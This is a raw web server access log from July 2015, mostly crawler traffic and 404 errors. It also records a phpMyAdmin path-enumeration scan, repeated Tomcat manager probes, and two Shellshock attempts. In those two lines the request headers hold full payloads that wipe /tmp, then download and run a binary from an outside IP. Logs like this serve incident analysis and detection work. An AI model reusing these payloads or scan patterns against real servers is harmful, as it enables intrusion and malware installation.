201.140.81.153 - - [19/Jul/2015:07:36:20 +0000] "GET /modules/system/system.theme.css?nm2iu1 HTTP/1.1" 404 522 "-" "Mozilla/4.0 (compatible;)"
151.80.31.153 - - [19/Jul/2015:08:00:49 +0000] "GET /tijuana/27-06-2015/asesinan-mujer-en-centro-comercial-de-mexicali HTTP/1.1" 404 500 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
182.53.140.96 - - [19/Jul/2015:08:04:02 +0000] "GET /Ringing.at.your.dorbell! HTTP/1.0" 404 506 "http://google.com/search?q=2+guys+1+horse" "x00_-gawa.sa.pilipinas.2015"
182.53.140.96 - - [19/Jul/2015:08:04:03 +0000] "GET / HTTP/1.0" 200 308 "-" "x00_-gawa.sa.pilipinas.2015"
182.53.140.96 - - [19/Jul/2015:08:04:04 +0000] "GET / HTTP/1.1" 200 345 "http://google.com/search?q=2+guys+1+horse" "x00_-gawa.sa.pilipinas.2015"
182.53.140.96 - - [19/Jul/2015:08:04:04 +0000] "GET /Diagnostics.asp HTTP/1.0" 404 497 "-" "x00_-gawa.sa.pilipinas.2015"
182.53.140.96 - - [19/Jul/2015:08:04:05 +0000] "GET / HTTP/1.0" 200 308 "-" "x00_-gawa.sa.pilipinas.2015"
182.53.140.96 - - [19/Jul/2015:08:04:05 +0000] "GET / HTTP/1.0" 200 308 "-" "x00_-gawa.sa.pilipinas.2015"
182.53.140.96 - - [19/Jul/2015:08:04:06 +0000] "GET / HTTP/1.0" 200 308 "-" "x00_-gawa.sa.pilipinas.2015"
151.80.31.153 - - [19/Jul/2015:08:42:48 +0000] "GET /seccion/mundo HTTP/1.1" 404 448 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.153 - - [19/Jul/2015:08:45:04 +0000] "GET /content/aviso-legal HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
201.140.81.153 - - [19/Jul/2015:09:26:07 +0000] "GET /sites/default/files/styles/150x85/public/videos/screenshot_2015-05-07_at_15.06.34.png?itok=GtB9k1l0 HTTP/1.1" 404 576 "-" "Mozilla/4.0 (compatible;)"
151.80.31.153 - - [19/Jul/2015:09:29:16 +0000] "GET /tijuana/26-06-2015/sedena-debera-entregar-version-publica-de-hechos-ocurridos-en-tlatlaya HTTP/1.1" 404 524 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.153 - - [19/Jul/2015:10:08:49 +0000] "GET /es-noticia/inseguridad-tijuana HTTP/1.1" 404 465 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.153 - - [19/Jul/2015:10:43:57 +0000] "GET /tijuana/26-06-2015/prohibe-donald-trump-empleados-de-univision-usar-sus-instalaciones HTTP/1.1" 404 520 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.153 - - [19/Jul/2015:11:06:56 +0000] "GET /tijuana/26-06-2015/mueren-ocho-migrantes-en-accidente-carretero-en-tabasco HTTP/1.1" 404 509 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
54.198.107.202 - - [19/Jul/2015:11:28:50 +0000] "HEAD / HTTP/1.1" 200 226 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
207.248.58.83 - - [19/Jul/2015:11:42:11 +0000] "GET /sites/all/themes/lajornada/css/images/facebook_nota.png HTTP/1.1" 404 546 "-" "Mozilla/4.0 (compatible;)"
201.140.81.153 - - [19/Jul/2015:11:49:17 +0000] "GET /sites/default/files/styles/320x213/public/carmen.jpg?itok=PgneV41a HTTP/1.1" 404 543 "-" "Mozilla/4.0 (compatible;)"
206.198.5.30 - - [19/Jul/2015:14:11:42 +0000] "GET /sites/default/files/favicon.ico HTTP/1.1" 404 522 "-" "Mozilla/4.0 (compatible;)"
207.248.58.83 - - [19/Jul/2015:14:23:35 +0000] "GET /sites/all/themes/lajornada/css/images/twitter_nota.png HTTP/1.1" 404 545 "-" "Mozilla/4.0 (compatible;)"
141.212.122.2 - - [19/Jul/2015:20:05:47 +0000] "GET /x HTTP/1.1" 400 0 "-" "Telesphoreo"
206.198.5.30 - - [19/Jul/2015:20:59:43 +0000] "GET /sites/default/files/css/css_RroIhOS-mZGnGW3HRUKhjzHVuuWLqJVCXWMpIjLit2A.css HTTP/1.1" 404 566 "-" "Mozilla/4.0 (compatible;)"
206.198.5.30 - - [19/Jul/2015:21:28:53 +0000] "GET /sites/default/files/js/js_4G0J-9LmZhogmlLPnVlAVlummXImn5iua9mmkX1rclA.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
200.23.91.182 - - [19/Jul/2015:22:15:35 +0000] "GET /sites/default/files/js/js_4G0J-9LmZhogmlLPnVlAVlummXImn5iua9mmkX1rclA.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
201.140.81.153 - - [19/Jul/2015:23:36:17 +0000] "GET /sites/default/files/styles/320x213/public/11044580_1567250320227112_7212466853142319063_n.jpg?itok=gmsCBdFf HTTP/1.1" 404 584 "-" "Mozilla/4.0 (compatible;)"
67.171.210.80 - - [20/Jul/2015:00:05:47 +0000] "GET / HTTP/1.1" 200 345 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:16.0) Gecko/20100101 Firefox/16.0"
67.171.210.80 - - [20/Jul/2015:00:05:47 +0000] "GET /favicon.ico HTTP/1.1" 404 537 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:16.0) Gecko/20100101 Firefox/16.0"
67.171.210.80 - - [20/Jul/2015:00:05:48 +0000] "GET /favicon.ico HTTP/1.1" 404 537 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:16.0) Gecko/20100101 Firefox/16.0"
67.171.210.80 - - [20/Jul/2015:00:06:01 +0000] "GET /foo.html HTTP/1.1" 200 428 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:16.0) Gecko/20100101 Firefox/16.0"
155.201.35.185 - - [20/Jul/2015:00:30:13 +0000] "GET /sites/default/files/css/css_xL5fITRH7_twemt1IEkHohY3QONG9UcJkHOvS7lk0nI.css HTTP/1.1" 404 566 "-" "Mozilla/4.0 (compatible;)"
54.144.20.248 - - [20/Jul/2015:02:02:52 +0000] "HEAD / HTTP/1.1" 200 226 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
206.198.5.30 - - [20/Jul/2015:02:41:20 +0000] "GET /sites/default/files/css/css_66VZvj_-3ono9uq1P-zJUCdMXFghnM_xeEdtzgRpR4c.css HTTP/1.1" 404 566 "-" "Mozilla/4.0 (compatible;)"
206.198.5.30 - - [20/Jul/2015:04:02:51 +0000] "GET /misc/menu-leaf.png HTTP/1.1" 404 509 "-" "Mozilla/4.0 (compatible;)"
66.240.236.119 - - [20/Jul/2015:05:24:58 +0000] "GET / HTTP/1.1" 200 289 "-" "-"
66.240.236.119 - - [20/Jul/2015:05:24:58 +0000] "GET /robots.txt HTTP/1.1" 404 445 "-" "-"
66.240.236.119 - - [20/Jul/2015:05:24:58 +0000] "GET /sitemap.xml HTTP/1.1" 404 446 "-" "-"
201.140.81.153 - - [20/Jul/2015:06:06:31 +0000] "GET /sites/all/themes/lajornada/layouts/panels/three_48_15_31/three_48_15_31.css?nm2iu1 HTTP/1.1" 404 566 "-" "Mozilla/4.0 (compatible;)"
206.198.5.30 - - [20/Jul/2015:06:12:08 +0000] "GET /sites/default/files/css/css_FgPfPNppfuP-YXLIlU1QX4D4B118rqs24lQI_PAEUus.css HTTP/1.1" 404 566 "-" "Mozilla/4.0 (compatible;)"
182.118.54.31 - - [20/Jul/2015:06:24:28 +0000] "GET / HTTP/1.1" 200 289 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
201.140.81.153 - - [20/Jul/2015:07:00:29 +0000] "GET /sites/default/files/css/css_FgPfPNppfuP-YXLIlU1QX4D4B118rqs24lQI_PAEUus.css HTTP/1.1" 404 566 "-" "Mozilla/4.0 (compatible;)"
201.140.81.153 - - [20/Jul/2015:07:04:43 +0000] "GET /images/46d483dda80a403676407f559aa73a60.jpg HTTP/1.1" 404 546 "-" "Mozilla/4.0 (compatible;)"
201.140.81.153 - - [20/Jul/2015:07:36:14 +0000] "GET /sites/default/files/js/js_ZnwoNJDEOUs8s9HM8kmgOpN2cw7GDTSfBwoW8pCWsJc.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
178.198.150.31 - - [20/Jul/2015:07:43:32 +0000] "HEAD http://52.10.36.255:80/1phpmyadmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:43:32 +0000] "HEAD http://52.10.36.255:80/2phpmyadmin/ HTTP/1.1" 404 194 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:43:32 +0000] "HEAD http://52.10.36.255:80/3phpmyadmin/ HTTP/1.1" 404 194 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:43:42 +0000] "HEAD http://52.10.36.255:80/PMA/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:43:42 +0000] "HEAD http://52.10.36.255:80/PMA2011/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:43:42 +0000] "HEAD http://52.10.36.255:80/PMA2012/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:43:43 +0000] "HEAD http://52.10.36.255:80/PMA2013/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:43:43 +0000] "HEAD http://52.10.36.255:80/PMA2014/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:43:55 +0000] "HEAD http://52.10.36.255:80/admin/phpMyAdmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:43:56 +0000] "HEAD http://52.10.36.255:80/admin/phpmyadmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:43:59 +0000] "HEAD http://52.10.36.255:80/admin/sysadmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:44:09 +0000] "HEAD http://52.10.36.255:80/administrator/db/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:44:09 +0000] "HEAD http://52.10.36.255:80/administrator/phpMyAdmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:44:09 +0000] "HEAD http://52.10.36.255:80/administrator/phpmyadmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:44:10 +0000] "HEAD http://52.10.36.255:80/administrator/pma/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:44:10 +0000] "HEAD http://52.10.36.255:80/administrator/web/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:17 +0000] "HEAD http://52.10.36.255:80/mysql/mysqlmanager/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:17 +0000] "HEAD http://52.10.36.255:80/mysql/pMA/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:17 +0000] "HEAD http://52.10.36.255:80/mysql/pma/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:18 +0000] "HEAD http://52.10.36.255:80/mysql/sqlmanager/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:18 +0000] "HEAD http://52.10.36.255:80/mysql/web/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:19 +0000] "HEAD http://52.10.36.255:80/mysqladmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:19 +0000] "HEAD http://52.10.36.255:80/mysqlmanager/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:20 +0000] "HEAD http://52.10.36.255:80/php-my-admin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:20 +0000] "HEAD http://52.10.36.255:80/php-myadmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:20 +0000] "HEAD http://52.10.36.255:80/phpMyAdmin-2/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:21 +0000] "HEAD http://52.10.36.255:80/phpMyAdmin-3/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:21 +0000] "HEAD http://52.10.36.255:80/phpMyAdmin-4/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:22 +0000] "HEAD http://52.10.36.255:80/phpMyAdmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:22 +0000] "HEAD http://52.10.36.255:80/phpMyAdmin2/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:23 +0000] "HEAD http://52.10.36.255:80/phpMyAdmin3/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:24 +0000] "HEAD http://52.10.36.255:80/phpMyAdmin4/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:24 +0000] "HEAD http://52.10.36.255:80/phpMyadmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:25 +0000] "HEAD http://52.10.36.255:80/phpmanager/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:25 +0000] "HEAD http://52.10.36.255:80/phpmy-admin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:26 +0000] "HEAD http://52.10.36.255:80/phpmy/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:26 +0000] "HEAD http://52.10.36.255:80/phpmyAdmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:36 +0000] "HEAD http://52.10.36.255:80/phpmyadmin3/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:36 +0000] "HEAD http://52.10.36.255:80/phpmyadmin4/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:37 +0000] "HEAD http://52.10.36.255:80/phppma/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:38 +0000] "HEAD http://52.10.36.255:80/pma/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:38 +0000] "HEAD http://52.10.36.255:80/pma2011/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:39 +0000] "HEAD http://52.10.36.255:80/pma2012/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:40 +0000] "HEAD http://52.10.36.255:80/pma2013/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:43 +0000] "HEAD http://52.10.36.255:80/pma2015/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:44 +0000] "HEAD http://52.10.36.255:80/program/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:45 +0000] "HEAD http://52.10.36.255:80/shopdb/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:46 +0000] "HEAD http://52.10.36.255:80/sql/myadmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:47 +0000] "HEAD http://52.10.36.255:80/sql/php-myadmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:56 +0000] "HEAD http://52.10.36.255:80/sql/phpMyAdmin4/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:57 +0000] "HEAD http://52.10.36.255:80/sql/phpmanager/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:45:57 +0000] "HEAD http://52.10.36.255:80/sql/phpmy-admin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:46:15 +0000] "HEAD http://52.10.36.255:80/sql/sqlweb/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:46:16 +0000] "HEAD http://52.10.36.255:80/sql/webadmin/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:46:16 +0000] "HEAD http://52.10.36.255:80/sql/webdb/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:46:17 +0000] "HEAD http://52.10.36.255:80/sql/websql/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
178.198.150.31 - - [20/Jul/2015:07:46:18 +0000] "HEAD http://52.10.36.255:80/sqlmanager/ HTTP/1.1" 404 195 "-" "Mozilla/5.0 Jorgee"
151.80.31.152 - - [20/Jul/2015:10:13:16 +0000] "GET /tijuana/28-06-2015/peru-y-paraguay-sorprenden-al-llegar-las-semifinales-de-copa-america HTTP/1.1" 404 522 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.152 - - [20/Jul/2015:12:35:06 +0000] "GET /tijuana/28-06-2015/pena-nieto-saldra-del-hospital-al-mediodia HTTP/1.1" 404 496 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
207.248.58.83 - - [20/Jul/2015:14:12:23 +0000] "GET /sites/all/themes/lajornada/css/images/facebook_footer.png HTTP/1.1" 404 548 "-" "Mozilla/4.0 (compatible;)"
155.201.35.185 - - [20/Jul/2015:15:45:57 +0000] "GET /sites/default/files/js/js_-QTOW7v2Syq9KuhK8fQW0JdnW1L-cffgNJhRbx3lXCM.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
54.162.117.63 - - [20/Jul/2015:16:03:44 +0000] "HEAD / HTTP/1.1" 200 226 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
207.248.58.83 - - [20/Jul/2015:16:05:21 +0000] "GET /sites/all/themes/lajornada/css/images/twitter_footer.png HTTP/1.1" 404 547 "-" "Mozilla/4.0 (compatible;)"
104.192.0.20 - - [20/Jul/2015:16:54:40 +0000] "-" 408 0 "-" "-"
207.248.58.83 - - [20/Jul/2015:17:51:21 +0000] "GET /sites/all/themes/lajornada/fonts/DIN/DIN-Medium.otf?1424842225 HTTP/1.1" 404 542 "-" "Mozilla/4.0 (compatible;)"
201.140.81.153 - - [20/Jul/2015:17:55:14 +0000] "GET /modules/system/system.menus.css?nm2iu1 HTTP/1.1" 404 522 "-" "Mozilla/4.0 (compatible;)"
182.118.54.31 - - [20/Jul/2015:18:32:51 +0000] "GET / HTTP/1.1" 200 289 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
125.88.11.103 - - [20/Jul/2015:20:42:18 +0000] "GET / HTTP/1.1" 200 345 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://211.147.2.192:999/2.6 -O /tmp/China.Z-ggfx >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-ggfx >> /tmp/Run.sh;echo /tmp/China.Z-ggfx >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://211.147.2.192:999/2.6 -O /tmp/China.Z-ggfx >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-ggfx >> /tmp/Run.sh;echo /tmp/China.Z-ggfx >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
207.248.58.83 - - [20/Jul/2015:21:37:21 +0000] "GET /sites/default/files/styles/148x99/public/images/50618007.jpg?itok=BxHZlHHx HTTP/1.1" 404 551 "-" "Mozilla/4.0 (compatible;)"
122.0.78.91 - - [20/Jul/2015:23:47:02 +0000] "GET / HTTP/1.1" 200 345 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://211.147.2.192:999/2.6 -O /tmp/China.Z-kszu  >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-kszu  >> /tmp/Run.sh;echo /tmp/China.Z-kszu  >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://211.147.2.192:999/2.6 -O /tmp/China.Z-kszu  >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-kszu  >> /tmp/Run.sh;echo /tmp/China.Z-kszu  >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
141.212.121.128 - - [21/Jul/2015:06:13:49 +0000] "GET / HTTP/1.1" 200 289 "-" "-"
222.186.21.41 - - [21/Jul/2015:07:28:20 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:28:26 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:28:31 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:28:37 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:28:42 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:28:48 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:28:53 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:28:59 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:29:04 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:29:10 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:29:15 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:29:21 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:29:26 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:29:32 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:29:37 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:29:42 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:29:48 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:29:53 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
